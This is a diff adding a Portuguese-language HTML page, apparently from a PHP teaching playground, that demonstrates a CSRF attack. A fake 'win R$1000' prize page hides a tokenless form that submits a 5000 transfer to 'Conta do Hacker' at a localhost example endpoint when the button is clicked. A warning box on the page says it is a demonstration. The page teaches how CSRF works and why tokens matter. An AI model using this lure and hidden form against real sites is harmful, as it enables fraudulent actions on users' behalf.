@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 GANHE R$ 1000 GRÁTIS!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            padding: 50px;
+            text-align: center;
+        }
+        .promo {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 { color: #f5576c; font-size: 36px; }
+        .btn {
+            background: #f5576c;
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 20px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+            color: #856404;
+        }
+        .code {
+            background: #2d3748;
+            color: #68d391;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            text-align: left;
+            margin-top: 20px;
+            font-size: 12px;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="promo">
+        <h1>🎉 PARABÉNS!</h1>
+        <p style="font-size: 20px;">Você foi selecionado para ganhar <strong>R$ 1.000,00</strong>!</p>
+        <p>Clique no botão abaixo para resgatar seu prêmio:</p>
+        
+        <button class="btn" onclick="atacar()">🎁 RESGATAR AGORA</button>
+
+        <div class="warning">
+            <strong>⚠️ ATENÇÃO - ISTO É UMA DEMONSTRAÇÃO</strong>
+            <p>Esta página está tentando fazer um <strong>ataque CSRF</strong>!</p>
+            <p>Ao clicar no botão, ela tenta enviar uma transferência para "Hacker" sem você saber.</p>
+        </div>
+
+        <div class="code">
+&lt;!-- Código malicioso escondido --&gt;<br>
+&lt;form id="ataque" action="http://localhost/..." method="POST"&gt;<br>
+&nbsp;&nbsp;&lt;input name="destino" value="Conta do Hacker"&gt;<br>
+&nbsp;&nbsp;&lt;input name="valor" value="5000"&gt;<br>
+&lt;/form&gt;
+        </div>
+    </div>
+
+    <!-- FORMULÁRIO MALICIOSO ESCONDIDO -->
+    <form id="ataque" action="http://localhost/playground-php/unlock-php-8/ch4/exemplo_protegido.php" method="POST" style="display:none;">
+        <input type="hidden" name="destino" value="Conta do Hacker">
+        <input type="hidden" name="valor" value="5000">
+        <!-- Note: SEM TOKEN! -->
+    </form>
+
+    <script>
+        function atacar() {
+            alert('🚨 Tentando enviar transferência maliciosa...\n\nDestino: Conta do Hacker\nValor: R$ 5.000,00\n\nVeja o resultado na próxima página!');
+            document.getElementById('ataque').submit();
+        }
+    </script>
+</body>
+</html>
